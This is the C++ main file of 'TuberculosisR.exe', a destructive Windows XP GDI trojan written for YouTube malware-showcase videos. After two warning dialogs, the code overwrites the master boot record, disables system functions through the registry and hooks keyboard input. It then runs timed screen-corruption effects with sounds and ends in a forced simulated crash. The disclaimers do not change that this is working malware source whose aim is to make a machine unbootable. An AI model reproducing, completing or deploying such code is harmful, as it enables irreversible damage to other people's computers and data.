#include "Tuberculosis.hpp"
/* TuberculosisR.exe by NotCCR
This malware was made for my good friends: N17Pro3426, RaduMinecraft, MrSuperBuddy, Come on Dell and Kwinda.
It only runs on Windows XP.
I'm not responsible for any damages caused as a result of this malware.
*/

int WINAPI WinMain(HINSTANCE hinst, HINSTANCE hprevinst, LPSTR cmdline, int cmdshow) {
	if (MessageBoxW(NULL, L"You\'re about to run the TuberculosisR.exe GDI-Trojan horse made by NotCCR, to be exclusively shown on the N17Pro3426, RaduMinecraft and Kwinda channels on YouTube.\r\nThe creator of this malware at no point has the intent for it to be used maliciously.\r\n\r\nIf you\'re running it on physical hardware or if you don\'t know what you\'re doing, press \'No\' and delete this file quickly!\r\nOtherwise, if you are running on a controlled environment, like an isolated virtual machine, you can run it and nothing will happen to your data on your main PC.\r\n\r\nNotCCR is NOT responsible for any damage made using this malware, reverse-engineering it, or any artificial removal of these disclaimers.\r\nPress \'Yes\' if you are running on a virtual machine. Press \'No\' otherwise.", L"GDI-Trojan.Win32.Tuberculosis.B: FIRST WARNING!", MB_YESNO|MB_DEFBUTTON2|MB_ICONWARNING) == IDNO)
	{
		return 0;
	}
	if (MessageBoxW(NULL, L"FINAL WARNING!!!\r\n\r\nIf you have read the previous message, running this malware can cause irreversible damage to your system!\r\nNotCCR holds no responsibility for anything done as a result of this malware!\r\nOnce you hit \'Yes\', it\'s final!\r\n\r\nStill execute this Trojan?", L"GDI-Trojan.Win32.Tuberculosis.B: F?I?N?A?L? ?W?A?R?N?I?N?G?", MB_YESNO|MB_DEFBUTTON2|MB_ICONWARNING) == IDNO)
	{
		return 0;
	}
	if (!CheckForWindowsXP()) NotWindowsXP();
	BootSector::DestroyMBR();
	Registry::SystemDisabler();
	Sleep(6000);
	HANDLE hJPEG = CreateThread(NULL, 0, GDIEffects::JPEGCompression, NULL, 0, 0);
	CreateThread(NULL, 0, Inputs::KeyboardInputs, NULL, 0, 0);
	HANDLE hDP = CreateThread(NULL, 0, GDIEffects::DarkPixelation, NULL, 0, 0);
	Sound1();
	Sleep(32000);
	EndPayload(hDP); EndPayload(hJPEG);
	HANDLE hIRT = CreateThread(NULL, 0, GDIEffects::InitialRGBTriple, NULL, 0, 0);
	Sound2();
	Sleep(10000);
	HANDLE hCR = CreateThread(NULL, 0, GDIEffects::ClipRects, NULL, 0, 0);
	Sleep(7000);
	EndPayload(hIRT); EndPayload(hCR);
	InvalidateRect(NULL, 0, 0);
	HANDLE hMRB = CreateThread(NULL, 0, GDIEffects::ModdedRectBounce, NULL, 0, 0);
	HANDLE hSF = CreateThread(NULL, 0, GDIEffects::ScreenFlip, NULL, 0, 0);
	HANDLE hXRS = CreateThread(NULL, 0, GDIEffects::XorRgbShake, NULL, 0, 0);
	Sound3();
	Sleep(30000);
	EndPayload(hXRS); EndPayload(hSF);
	InvalidateRect(NULL, 0, 0);
	HANDLE hOR = CreateThread(NULL, 0, GDIEffects::OverlayRgbquad, NULL, 0, 0);
	HANDLE hABB = CreateThread(NULL, 0, GDIEffects::AngledBitBlt, NULL, 0, 0);
	Sound4();
	Sleep(34000);
	EndPayload(hOR); EndPayload(hABB);
	HANDLE hSBA = CreateThread(NULL, 0, GDIEffects::SplitBltAnd, NULL, 0, 0);
	Sound5();
	Sleep(15000);
	EndPayload(hSBA);
	InvalidateRect(NULL, 0, 0);
	HANDLE hJPEG2 = CreateThread(NULL, 0, GDIEffects::JPEGCompression, NULL, 0, 0);
	HANDLE hSBO = CreateThread(NULL, 0, GDIEffects::SplitBltOr, NULL, 0, 0);
	Sleep(15000);
	EndPayload(hJPEG2); EndPayload(hSBO);
	InvalidateRect(NULL, 0, 0);
	HANDLE hSM = CreateThread(NULL, 0, GDIEffects::SolarisMelting, NULL, 0, 0);
	HANDLE hAS = CreateThread(NULL, 0, GDIEffects::ArcSpectrum, NULL, 0, 0);
	Sound6();
	Sleep(28000);
	EndPayload(hSM);
	InvalidateRect(NULL, 0, 0);
	HANDLE hSS = CreateThread(NULL, 0, GDIEffects::SetShake, NULL, 0, 0);
//	Sound7();
	Sleep(3000);
	// 52 seconds left
	HANDLE hSI = CreateThread(NULL, 0, GDIEffects::ScreenInvert, NULL, 0, 0);
	Sleep(7000);
	// 45 seconds left
	EndPayload(hSI); EndPayload(hSS);
	HANDLE hTS1 = CreateThread(NULL, 0, GDIEffects::TrigonShake1, NULL, 0, 0);
	HANDLE hPD = CreateThread(NULL, 0, GDIEffects::PixelationDelete, NULL, 0, 0);
	Sleep(10000);
	// 35 seconds left
	EndPayload(hTS1); EndPayload(hPD); EndPayload(hSS);
	InvalidateRect(NULL, 0, 0);
	HANDLE hTS2 = CreateThread(NULL, 0, GDIEffects::TrigonShake2, NULL, 0, 0);
	HANDLE hPD2 = CreateThread(NULL, 0, GDIEffects::PixelationDelete2, NULL, 0, 0);
	Sleep(1000);
	HANDLE hOR2 = CreateThread(NULL, 0, GDIEffects::OverlayRgbquad, NULL, 0, 0);
	Sleep(2000);
	// 32 seconds left
	HANDLE hRoto = CreateThread(NULL, 0, GDIEffects::RotateScreen, NULL, 0, 0);
	Sleep(3000);
	EndPayload(hAS); EndPayload(hOR2);
	HANDLE hHPB = CreateThread(NULL, 0, GDIEffects::HatchPatBlt, NULL, 0, 0);
	HANDLE hCR2 = CreateThread(NULL, 0, GDIEffects::ClipRects, NULL, 0, 0);
	Sleep(18000);
	EndPayload(hTS2); EndPayload(hPD2); EndPayload(hHPB); EndPayload(hCR2);
	InvalidateRect(NULL, 0, 0);
	HANDLE hVR = CreateThread(NULL, 0, GDIEffects::VerticalRgbquad, NULL, 0, 0);
	Sound8();
	Sleep(15000);
	EndPayload(hRoto); EndPayload(hVR);
	InvalidateRect(NULL, 0, 0);
	HANDLE hFinalPayload = CreateThread(NULL, 0, GDIEffects::FinalMelt, NULL, 0, 0);
	Sound9();
	Sleep(10000);
	DWORD ntResponse;
	SimulateSystemCrash(0xc0000011, ntResponse);
}
